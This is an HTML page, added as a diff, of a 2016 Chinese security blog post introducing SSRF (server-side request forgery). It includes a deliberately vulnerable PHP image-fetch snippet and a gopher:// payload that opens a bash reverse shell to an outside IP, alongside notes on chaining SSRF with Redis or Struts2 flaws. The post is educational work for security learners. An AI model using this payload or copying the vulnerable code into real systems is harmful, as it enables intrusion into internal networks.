@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>从入门到精通SSRF（1） - 小黑屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从入门到精通SSRF（1）">
+<meta property="og:url" content="http://das.scusec.org/2016/08/23/easy-to-SSRF-1/index.html">
+<meta property="og:site_name" content="小黑屋">
+<meta property="og:description" content="0x00很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。">
+<meta property="og:image" content="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151540.png">
+<meta property="og:image" content="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151520.png">
+<meta property="og:image" content="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151400-1024x674.png">
+<meta property="og:image" content="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151428-1024x433.png">
+<meta property="og:updated_time" content="2016-08-23T02:53:13.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从入门到精通SSRF（1）">
+<meta name="twitter:description" content="0x00很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+      <a id="logo" class="logo logo-text" href="/">小黑屋</a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">文档</a>
+        
+          <a class="main-nav-link" href="/categories">分类</a>
+        
+          <a class="main-nav-link" href="/tags">标签</a>
+        
+          <a class="main-nav-link" href="/links">链接</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://das.scusec.org"></form>
+        </div>
+      </nav>
+    </div>
+  </div>
+</header>
+    <section id="main" class="outer"><article id="post-easy-to-SSRF-1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      从入门到精通SSRF（1）
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2016/08/23/easy-to-SSRF-1/" class="article-date">
+  <time datetime="2016-08-23T02:53:13.000Z" itemprop="datePublished">2016-08-23</time>
+</a>
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。<br><a id="more"></a></p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先在php上写了一个ssrf简单环境。</p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151540.png" alt="读取远程图片"></p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151520.png" alt="使用其他协议"></p>
+<p>对比上面两张图，本来这个功能在头像功能也许大家都见过，可以直接填入图片的url地址设定它为自己的头像。然而如果对填入的url地址没有处理，就可能导致本机etc/passed或者内网文件被这个功能直接读取出来。<br>在开启其他脑洞，进行内网端口探测以后，假设内网存在 struts2命令执行 这种可以把exp通过get参数简单传入的漏洞 ，利用从这个ssrf点传入攻击代码反弹一个shell。。。那么这把钥匙则可以直接打开内网的大门。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php &#10;if (isset($_GET[&#39;url&#39;]))  &#123;  &#10;$content = file_get_contents($_GET[&#39;url&#39;]);  &#10;$filename =&#39;./images/&#39;.rand().&#39;img1.jpg&#39;;  &#10;file_put_contents($filename, $content);  &#10;$img = &#34;&#60;img src=\&#34;&#34;.$filename.&#34;\&#34;/&#62;&#34;;  &#10;&#125;  &#10;echo $img;  &#10;?&#62;</span><br></pre></td></tr></table></figure>
+<p>这个是简单测试代码，从代码上看，除了file_get_content()还有fsockopen()、curl_exec()等等资源获取的函数都可能存在这个漏洞。从黑盒来看，用户控制点作为资源地址传到函数中进行资源请求还是比较明显的，甚至有些vpn产品把这个当成一个正常的功能来使人员在外界可以访问到内网的系统。</p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151400-1024x674.png" alt="做映射的vpn设备"></p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151428-1024x433.png" alt="ssrf请求其他资源"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>zzx说，能够对外发送网络请求的点都有可能存在ssrf漏洞。</p>
+<p>因此针对应用二次挖掘的时候，在discuz、weblogic、sql连接器、xml执行器等等位置都可能存在这个漏洞。存在漏洞点对协议的支持也和是否能利用有很大关系，比如http get/put;webdav put;file;ftp/smtp/pop2;dict等等。<br>是否能够回显同样也是利用的重要因素，比如上面代码可以直接获取结果的完全回显，或者是只会返回成功失败的布尔回显以及甚至无回显。前段时间看到百度对自家ssrf的漏洞危险等级就是用回显程度来定义的。<br>如果漏洞存在点支持gopher协议可以直接用来进行文件操作getshell（参考gopher在xxe中的使用）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &#62;%2526 /dev/tcp/172.19.23.228/2333 0&#62;%25261null</span><br></pre></td></tr></table></figure></p>
+<p>所以简单来说，这个漏洞本身在很多地方都不被定义为漏洞。这个漏洞相当于一个起手式，比如一个布尔回显不支持gopher等协议的ssrf点，如果没有后招，则只能做一个内网拓扑，杀伤力很小。如果配合打出组合技则能打出意想不到的巨大杀伤，比如内网恰巧有一台未授权的redis。</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在参考链接中给出一些我觉得这个漏洞利用比较经典的例子，更多的巧妙使用协议、巧妙组合其他利用就不再贴图了，抛砖引玉，有兴趣的少年可以进一步找出更多有趣的利用，脑洞有多大，漏洞能量就有多大。<br>最近的cve vBulletin rec中ssrf的利用就非常的经典。</p>
+<p>参考链接<br><a href="http://drops.wooyun.org/papers/8261" target="_blank" rel="external">http://drops.wooyun.org/papers/8261</a><br><a href="http://drops.wooyun.org/web/7550" target="_blank" rel="external">http://drops.wooyun.org/web/7550</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0213982" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0213982</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0214429" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0214429</a><br><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ksss-SSRF-gopher/">ksss,SSRF,gopher</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/08/23/waf-sql-bypass/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-title"><span>&lt;</span>&nbsp;
+        
+          浅谈waf下的sql注入绕过
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/08/23/code-audit-of-zcncms2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">代码审计——zcncms几处漏洞合集(二)&nbsp;<span>&gt;</span></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+  
+  <section id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-easy-to-SSRF-1" data-title="从入门到精通SSRF（1）" data-url="http://das.scusec.org/2016/08/23/easy-to-SSRF-1/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:'dassec'};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+      </script>
+    <!-- 多说公共JS代码 end -->
+  </section>
+  </section>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 das&nbsp;
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>
+    </div>
+  </div>
+</footer>
+    
+
+<script src="/js/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+  </div>
+</body>
+</html>
